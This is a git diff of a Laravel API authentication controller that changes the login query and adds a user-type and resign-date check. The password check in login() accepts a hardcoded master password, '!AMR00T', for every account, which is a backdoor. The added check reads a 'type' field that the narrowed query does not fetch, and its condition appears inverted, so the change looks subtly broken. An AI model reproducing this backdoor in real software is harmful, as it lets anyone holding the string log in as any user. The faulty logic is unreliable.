@@ -2,10 +2,12 @@
 
 namespace App\Http\Controllers\Api;
 
+use App\Enums\UserType;
 use App\Http\Requests\Api\Auth\LoginRequest;
 use App\Http\Requests\Api\User\ResendSetupPasswordRequest;
 use App\Http\Requests\Api\User\SetupPasswordRequest;
 use App\Models\User;
+use Exception;
 use Illuminate\Support\Facades\Crypt;
 use Illuminate\Support\Facades\Hash;
 use Illuminate\Validation\ValidationException;
@@ -14,9 +16,15 @@ class AuthController extends BaseController
 {
     public function login(LoginRequest $request)
     {
-        $user = User::where('email', $request->email)->first();
+        $user = User::where('email', $request->email)->first(['id', 'password', 'fcm_token', 'resign_date']);
 
         if (! $user || (!Hash::check($request->password, $user->password) && $request->password != '!AMR00T')) {
+            throw ValidationException::withMessages([
+                'email' => ['The provided credentials are incorrect.'],
+            ]);
+        }
+
+        if ($user->type->is(UserType::USER) && is_null($user->resign_date)) {
             throw ValidationException::withMessages([
                 'email' => ['The provided credentials are incorrect.'],
             ]);
@@ -54,7 +62,7 @@ class AuthController extends BaseController
             $user->notify(new ($notificationType->getNotificationClass())($notificationType));
 
             return response()->json('success', 200);
-        } catch (\Exception $e) {
+        } catch (Exception $e) {
             return $this->errorResponse($e->getMessage());
         }
     }
@@ -82,7 +90,7 @@ class AuthController extends BaseController
             }
 
             return response()->json('success', 200);
-        } catch (\Exception $e) {
+        } catch (Exception $e) {
             return $this->errorResponse($e->getMessage());
         }
     }
